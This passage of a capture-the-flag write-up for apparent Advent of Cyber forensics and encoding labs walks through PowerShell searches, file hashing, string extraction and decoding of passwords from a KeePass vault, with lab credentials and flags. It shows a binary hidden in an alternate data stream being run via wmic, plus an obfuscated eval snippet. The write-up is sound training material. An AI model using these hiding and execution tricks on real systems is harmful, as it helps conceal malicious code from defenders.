a hidden folder that contains files for Elf 3. What is the name of the hidden folder?">​</a></h3><p>We can run the following cmdlet to find the hidden folder for Elf 3.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\&gt; ls -Recurse -Path C:\Windows -Filter &#x27;*3*&#x27; -Directory -Hidden -ErrorAction SilentlyContinue</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Directory: C:\Windows\System32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">d--h--       11/23/2020   3:26 PM                3lfthr3e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can then change into that directory.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\&gt; cd C:/Windows/System32/3lfthr3e</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="how-many-words-does-the-first-file-contain">How many words does the first file contain?<a href="#how-many-words-does-the-first-file-contain" class="hash-link" aria-label="Direct link to How many words does the first file contain?" title="Direct link to How many words does the first file contain?">​</a></h3><p>We can pipe the output of <code>Get-Content</code> into <code>Measure-Object -Word</code> to get a word count.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Windows\System32\3lfthr3e&gt; cat 1.txt | Measure-Object -Word</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Lines Words Characters Property </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----- ----- ---------- --------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       9999</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-2-words-are-at-index-551-and-6991-in-the-first-file">What 2 words are at index 551 and 6991 in the first file?<a href="#what-2-words-are-at-index-551-and-6991-in-the-first-file" class="hash-link" aria-label="Direct link to What 2 words are at index 551 and 6991 in the first file?" title="Direct link to What 2 words are at index 551 and 6991 in the first file?">​</a></h3><p>We can use square brackets to index the output.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Windows\System32\3lfthr3e&gt; (cat 1.txt)[551]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Red</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Windows\System32\3lfthr3e&gt; (cat 1.txt)[6991]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Ryder</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-in-the-2nd-file-for-the-phrase-from-the-previous-question-to-get-the-full-answer-what-does-elf-3-want">Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?<a href="#search-in-the-2nd-file-for-the-phrase-from-the-previous-question-to-get-the-full-answer-what-does-elf-3-want" class="hash-link" aria-label="Direct link to Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?" title="Direct link to Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?">​</a></h3><p>We can search inside a file with a pattern as follows:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Windows\System32\3lfthr3e&gt; Select-String 2.txt -Pattern &quot;redryder*&quot; </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2.txt:558704:redryderbbgun</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-21-time-for-some-elforensics">Day 21: Time for some ELForensics<a href="#day-21-time-for-some-elforensics" class="hash-link" aria-label="Direct link to Day 21: Time for some ELForensics" title="Direct link to Day 21: Time for some ELForensics">​</a></h2><p><em>Category: Blue Teaming</em><br>
<em>Tags: Forensics</em></p><blockquote><p>Understand how to use PowerForensics to find clues as to where the naughty list was hidden.</p></blockquote><p>IP: <code>10.10.154.191</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-via-rdp">Connecting via RDP<a href="#connecting-via-rdp" class="hash-link" aria-label="Direct link to Connecting via RDP" title="Direct link to Connecting via RDP">​</a></h3><p>We are given credentials <code>littlehelper:iLove5now!</code> to connect to the Windows machine using RDP.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/rdp_login-74ee0b31a81a477771a6160a8e87bf0b.png" width="603" height="313" class="img_ev3q"></p><p>And we land into a Windows desktop!</p><p><img loading="lazy" alt="screenshot" src="/assets/images/desktop-9b6ca970580e1e7974a734b38847e3d7.png" width="1600" height="900" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-started-1">Getting started<a href="#getting-started-1" class="hash-link" aria-label="Direct link to Getting started" title="Direct link to Getting started">​</a></h3><p>First we open up Powershell (which is conviniently already in the TaskBar) and enter the Documents directory.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper&gt; cd Documents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="contents-of-the-db-file-hashtxt-file">Contents of the &quot;<code>db file hash.txt</code>&quot; file.<a href="#contents-of-the-db-file-hashtxt-file" class="hash-link" aria-label="Direct link to contents-of-the-db-file-hashtxt-file" title="Direct link to contents-of-the-db-file-hashtxt-file">​</a></h3><p>We can use the <code>Get-Content</code> cmdlet or the <code>gc</code>, <code>cat</code> or <code>type</code> aliases to get the contents of the text file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt; cat &quot;db file hash.txt&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Filename:       db.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MD5 Hash:       596690FFC54AB6101932856E6A78E3A1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-hash-of-deebeeexe">Getting the hash of <code>deebee.exe</code><a href="#getting-the-hash-of-deebeeexe" class="hash-link" aria-label="Direct link to getting-the-hash-of-deebeeexe" title="Direct link to getting-the-hash-of-deebeeexe">​</a></h3><p>We can use the <code>Get-FileHash</code> cmdlet to get the MD5 hash of <code>deebee.exe</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt; Get-FileHash -Algorithm MD5 deebee.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Algorithm       Hash                                                                   Path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">---------       ----                                                                   ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MD5             5F037501FB542AD2D9B06EB12AED09F0                                       C:\Users\littlehelper\Documents\deebee.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-7">Getting the flag!<a href="#getting-the-flag-7" class="hash-link" aria-label="Direct link to Getting the flag!" title="Direct link to Getting the flag!">​</a></h3><p>We can use <code>C:\Tools\strings64.exe</code> (similar to the strings command on Linux) to find all the strings in a binary file. Then we pipe it into the <code>Select-String</code> cmdlet (which will work similar to grep in Linux) with a pattern.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt; /Tools/strings64.exe -nobanner deebee.exe | Select-String -Pattern &quot;THM{*&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{f6187e6cbeb1214139ef313e108cb6f9}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag 1: <code>THM{f6187e6cbeb1214139ef313e108cb6f9}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="running-the-real-database-connector-and-getting-another-flag">Running the real database connector and getting another flag!<a href="#running-the-real-database-connector-and-getting-another-flag" class="hash-link" aria-label="Direct link to Running the real database connector and getting another flag!" title="Direct link to Running the real database connector and getting another flag!">​</a></h3><p>We can look at the executable for Alternate Data Streams.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt; Get-Item deebee.exe -Stream *</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\littlehelper\Documents\deebee.exe::$DATA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\littlehelper\Documents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSChildName   : deebee.exe::$DATA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSDrive       : C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSProvider    : Microsoft.PowerShell.Core\FileSystem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSIsContainer : False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">FileName      : C:\Users\littlehelper\Documents\deebee.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Stream        : :$DATA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length        : 5632</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\littlehelper\Documents\deebee.exe:hidedb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\littlehelper\Documents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSChildName   : deebee.exe:hidedb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSDrive       : C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSProvider    : Microsoft.PowerShell.Core\FileSystem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PSIsContainer : False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">FileName      : C:\Users\littlehelper\Documents\deebee.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Stream        : hidedb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length        : 6144</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can then run hidden executable.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">PS C:\Users\littlehelper\Documents&gt; wmic process call create $(Resolve-Path .\deebee.exe:hidedb)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Executing (Win32_Process)-&gt;Create()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Method execution successful.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Out Parameters:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">instance of __PARAMETERS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">{</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ProcessId = 172;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ReturnValue = 0;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">};</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And then we get our final flag!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Choose an option:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1) Nice List</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2) Naughty List</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3) Exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{088731ddc7b9fdeccaed982b07c297c}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Select an option:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag 2: <code>THM{088731ddc7b9fdeccaed982b07c297c}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-22-elf-mceager-becomes-cyberelf">Day 22: Elf McEager becomes CyberElf<a href="#day-22-elf-mceager-becomes-cyberelf" class="hash-link" aria-label="Direct link to Day 22: Elf McEager becomes CyberElf" title="Direct link to Day 22: Elf McEager becomes CyberElf">​</a></h2><p><em>Category: Blue Teaming</em><br>
<em>Tags: Cyberchef, Encoding</em></p><blockquote><p>You have found where the naughty list has been hidden online but it&#x27;s encoded. Learn how to decode the contents of this file using CyberChef.</p></blockquote><p>IP: <code>10.10.195.171</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="logging-in">Logging in<a href="#logging-in" class="hash-link" aria-label="Direct link to Logging in" title="Direct link to Logging in">​</a></h3><p>Once again, we can use Microsoft RDP to log in. Once logged in, we find a folder with the name <code>dGhlZ3JpbmNod2FzaGVyZQ==</code>. It kinda looks like base64, so i decide to base 64 decode it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day22-elf-mceager-becomes-cyberelf$ echo &quot;dGhlZ3JpbmNod2FzaGVyZQ==&quot; | base64 -d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">thegrinchwashere</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ahh, big yikes...</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="opening-keypass">Opening keypass<a href="#opening-keypass" class="hash-link" aria-label="Direct link to Opening keypass" title="Direct link to Opening keypass">​</a></h3><p>If we open keypass, we find out that it is locked with a master password. We can try to use <code>thegrinchwashere</code> as the password and sure enough, it works!</p><p><img loading="lazy" alt="screenshot" src="/assets/images/locked_keypass-5e881e97a37c064be8c2cd86546188f6.png" width="1132" height="639" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-passwords">Getting the passwords<a href="#getting-the-passwords" class="hash-link" aria-label="Direct link to Getting the passwords" title="Direct link to Getting the passwords">​</a></h3><p>I will be using CyberChef to decode most if not all of these.  </p><p>The password for the Elf Server is <code>736e30774d346e21</code> which we can decode using hex to find <code>sn0wM4n!</code>  </p><p>The password for the ElfMail is <code>&amp;#105;&amp;#99;&amp;#51;&amp;#83;&amp;#107;&amp;#97;&amp;#116;&amp;#105;&amp;#110;&amp;#103;&amp;excl;</code> which we can decode using HTML Entity to find <code>ic3Skating!</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-8">Getting the flag<a href="#getting-the-flag-8" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>If we look at the notes for the Elf Security System. It looks like obfuscated JavaScript code.</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">eval</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token known-class-name class-name">String</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token method function property-access" style="color:rgb(80, 250, 123)">fromCharCode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">118</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">97</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">114</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">111</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">109</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">101</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">115</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">116</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">114</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">105</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">110</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">103</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">61</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token 